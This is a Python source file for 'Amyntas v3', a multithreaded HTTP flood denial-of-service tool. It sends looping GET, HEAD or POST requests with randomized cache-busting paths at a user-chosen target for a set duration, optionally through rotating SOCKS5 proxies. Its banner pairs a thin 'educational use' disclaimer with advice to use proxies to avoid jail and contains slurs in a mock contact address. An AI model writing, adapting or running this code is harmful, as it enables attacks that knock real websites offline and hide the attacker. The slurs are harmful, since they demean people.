#!/usr/bin/env python3

import argparse, socks, socket, ssl, time, sys, threading, os, requests
from random import randint, choice
from colorama import Fore
#from datetime import datetime

def clear():
    os.system('cls' if os.name.startswith('nt') else 'clear') # Magic

# Basic colours lol
r  = Fore.RED
y  = Fore.YELLOW
w  = Fore.WHITE
rr = Fore.RESET

desc = f'{w}Thanks for using Amyntas v3! Use a proxy to be safe, unless you want to end up in jail.'

# Arguments
parser = argparse.ArgumentParser(prog=sys.argv[0], usage='%(prog)s [options] -t http://target.domain', description=desc, allow_abbrev=False)
parser.add_argument('-t',  '--target',       dest = 'target',       default = 'https://target.com',   help='Target URL (Example: https://google.com or http://fishysite.com)', type=str)
parser.add_argument('-m',  '--mode',         dest = 'attack_mode',  default = 'GET',                  help='Attack mode (GET / HEAD / POST / SLOWLORIS)', type=str)
parser.add_argument('-v',  '--verbose',      dest = 'verbose',      default = False,                  help='Show info when attacking', type=bool)
parser.add_argument('-d',  '--duration',     dest = 'duration',     default = 80,                     help='Attack duration', type=int)
parser.add_argument('-p',  '--proxy',        dest = 'proxy',        default = '',                     help='Use a proxy when attacking, only supports SOCKS5 (Example: 127.0.0.1:1337)', type=str)
parser.add_argument('-pl', '--proxy-list',   dest = 'proxylist',    default = '',                     help='Path to file with [SOCKS5] proxies', type=str)
parser.add_argument('-u',  '--user-agents',  dest = 'ualist',       default = 'lists/useragents.txt', help='Path to list of user agents', type=str)
parser.add_argument('-r',  '--referers',     dest = 'reflist',      default = 'lists/referers.txt',   help='Path to list of referrers', type=str)
parser.add_argument('-rp', '--rotate-proxy', dest = 'rotate_proxy', default = False,                  help='Switch proxies while attacking (True/False)', type=bool)
parser.add_argument('-w',  '--workers',      dest = 'workers',      default = 100,                    help='Amount of threads to use when attacking', type=int)
args = parser.parse_args()

banner = f'''{r}
       d8888                                 888                      
      d88888                                 888                      
     d88P888                                 888                      
    d88P 888 88888b.d88b.  888  888 88888b.  888888  8888b.  .d8888b  
   d88P  888 888 "888 "88b 888  888 888 "88b 888        "88b 88K      
  d88P   888 888  888  888 888  888 888  888 888    .d888888 "Y8888b. 
 d8888888888 888  888  888 Y88b 888 888  888 Y88b.  888  888      X88 
d88P     888 888  888  888  "Y88888 888  888  "Y888 "Y888888  88888P' v3 :)
                                888                                   
                           Y8b d88P                                   
                            "Y88P"

{r}[{w}Disclaimer{r}]
{w}I, the author, am not responsible for anything you attack! I made this tool for people to
purely attack THEIR OWN SYSTEMS. I do not condone illegal use of it!

{r}"{w}Purely for educational use only{r}"

{w}If you wish to attack systems that you DO NOT OWN, make sure you know what you are doing!
Use a proxy to be safe, unless you want to end up in jail.
If you still wish to sue me, emails go here {r}[{w}fuck.you@fag.gov{r}]{w}

Stay safe.
{r}[{w}------------------------------------------------------------------------------------------{r}]{rr}
'''

useragents     = ['Amnytas3.0 (Greetz to APTw3)']
referers       = ['https://fbi.gov/c99.php?shell=']
proxy_list     = []
content_types  = ['multipart/form-data', 'application/x-url-encoded'] # for later usage
accept_charset = ['UTF-8', 'UTF-16', 'ISO-8859-1', 'ISO-8859-15', 'ISO-8859-2', 'Windows-1251'] # for later usage

def load_proxylist():
    with open(args.proxylist, 'r') as proxies:
        for proxy in proxies.readlines():
            proxy_list.append(proxy.strip())

def load_useragents():
    with open(args.ualist, 'r') as uas:
        for ua in uas.readlines():
            useragents.append(ua.strip())

def load_referrers():
    with open(args.reflist, 'r') as refs:
        for ref in refs.readlines():
            referers.append(ref.strip())

def randomstr(min, max):
    range_ = randint(min, max)
    chars = 'qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM0123456789'
    return ''.join(choice(chars) for _ in range(range_))

def postdata():
    post_datas = [
        f'Content-Type: application/x-www-form-urlencoded\r\n\r\n{randomstr(1, 20)}={randomstr(1, 20)}&{randomstr(1, 20)}={randomstr(1, 20)}',
        f'Content-Type: application/json\r\n\r\n{{"{randomstr(1, 20)}": "{randomstr(1, 20)}", "{randomstr(1, 20)}": "{randomstr(1, 20)}" }}'
    ]
    return choice(post_datas)

# Attack script
def attack(threadcount):
    try:
        sock = socks.socksocket()
        sock.settimeout(3)
        if args.proxy:
            ip, port = args.proxy.split(':')
            if args.verbose:
                print(f'{r}[{rr}!{r}]{rr} [THREAD {threadcount}] Proxy set to {args.proxy}')

            sock.set_proxy(socks.SOCKS5, str(ip), int(port))
        elif args.rotate_proxy:
            if len(proxy_list) < 0:
                sys.exit("Proxy list is empty!")
            
            ip, port = choice(proxy_list).split(':') # each thread gets a proxy, if the proxy fails the thread ends
            if args.verbose:
                print(f'{r}[{rr}!{r}]{rr} [THREAD {threadcount}] Rotating proxies enabled, setting proxy to {ip}:{port}')

            sock.set_proxy(socks.SOCKS5, str(ip), int(port))

        url = args.target
        if url.startswith('http://'): # If its HTTP
            host = url.replace('http://', '')
            target = socket.gethostbyname(host)
            sock.connect((target, 80))

        elif url.startswith('https://'): # If its HTTPS
            host = url.replace('https://', '')
            target = socket.gethostbyname(host)

            sock.connect((target, 443))
            sock = ssl.wrap_socket(sock)

        else:
            print(f'{r}[{rr}!{r}]{rr} [THREAD {threadcount}] {url} is not a valid url!')
            sys.exit()
        
        pkt = None
        if args.attack_mode == 'GET':
            pkt = f'GET /{randomstr(1, 20)}?{randomstr(1, 20)}={randomstr(1, 20)} HTTP/1.1\r\nHost: {host}\r\n\r\n'.encode() # Cache bypass ayee
        
        elif args.attack_mode == 'HEAD':
            pkt = f'HEAD / HTTP/1.1\r\nConnection: close\r\n'.encode()

        elif args.attack_mode == 'POST':
            pkt = f'POST /{randomstr(1, 20)}?{randomstr(1, 20)}={randomstr(1, 20)} HTTP/1.1\r\nHost: {host}\r\n{postdata()}'.encode()

        stop = time.time() + args.duration # Get the time
        while time.time() < stop:
            sock.send(pkt)

        sock.shutdown(socket.SHUT_RDWR) # shut down gracefully
        if args.verbose:
            print(f'{r}[{rr}!{r}]{rr} Socket shut down.')
        sys.exit() # close thread
    except KeyboardInterrupt:
        if args.verbose:
            print(f'{r}[{rr}!{r}]{rr} CTRL-C pressed, lets exit!')
        sys.exit()
    except socket.timeout:
        if args.verbose:
            print(f'{r}[{rr}!{r}]{rr} Server timed out!')
        pass

    # Connection errors
    except ConnectionResetError:
        if args.verbose:
            print(f'{r}[{rr}!{r}]{rr} Connection Reset!')
        sys.exit()
    except ConnectionRefusedError:
        if args.verbose:
            print(f'{r}[{rr}!{r}]{rr} Connection Refused!')
        sys.exit()
    except ConnectionAbortedError:
        if args.verbose:
            print(f'{r}[{rr}!{r}]{rr} Connection Aborted! Check if any anti-virus or firewalls may be interrupting.')
        sys.exit()

# Print the usage
def usage():
    print(f'{r}[{w}#{r}] {y}{"-"*12}{w}Amyntas 3 Usage{y}{"-"*12} {r}[{w}#{r}]{rr}')
    print(f'   python {sys.argv[0]} -t http://target.domain')
    print(f'    type python {sys.argv[0]} -h for more info')
    print(f'{r}[{w}#{r}] {y}--------------------------------------- {r}[{w}#{r}]{rr}')
    exit()

# Main
def main():
    clear()

    if len(sys.argv) < 2:
        usage()
    else:
        try:
            if args.proxylist:
                load_proxylist()
                print(f'{r}[ {w}Loaded {len(proxy_list)} proxies from ({args.proxylist}) {r}]{rr}')
            
            if args.ualist:
                load_useragents()
                print(f'{r}[ {w}Loaded {len(useragents)} useragents from ({args.ualist}) {r}]{rr}')
            
            if args.reflist:
                print(f'{r}[ {w}Loaded {len(referers)} referers from ({args.reflist}) {r}]{rr}')
                load_referrers()


            print(banner)
            yn = input(f'\nLocked onto {r}{args.target}{rr}. Correct? (Y/N) ').upper() # Verify it
            if yn == 'Y':

                print(f'Building {r}{args.workers}{rr} threads.')
                threads = []

                for x in range(args.workers):
                    kaboom = threading.Thread(target=attack, args=(x,), daemon=True)#.start()
                    threads.append(kaboom)

                print(f'Threads built. Ready to fire.')
                yn = input('Ready? (Y/N) ').upper() # Verify again
                sure = input('You absolutely ready? (Y/N) ').upper() # Just to make sure

                if yn == 'Y' and sure == 'Y':
                    print(f'{r}[{rr}!{r}]{rr} Launching attack on {r}{args.target}{rr}.')
                    count = 0

                    for thread in threads: # Starts every single thread
                        count += 1
                        print(f'{r}[{rr}!{r}]{rr} Started thread {r}{count}{rr}.')
                        thread.start()
                    print(f'{r}[{rr}!{r}]{rr} All threads started.') # start the counter once every thread has started

                    for thread in threads:
                        thread.join()
                    print(f'{r}[{rr}!{r}]{rr} All threads have finished attacking. Goodbye.')
                    sys.exit()

                else:
                    print('Goodbye!')
                    exit()
            else:
                print('Goodbye!')
                exit()
        except KeyboardInterrupt:
            print('\nCTRL-C Pressed. Closing now.')
            exit()

if __name__ == '__main__':
    main()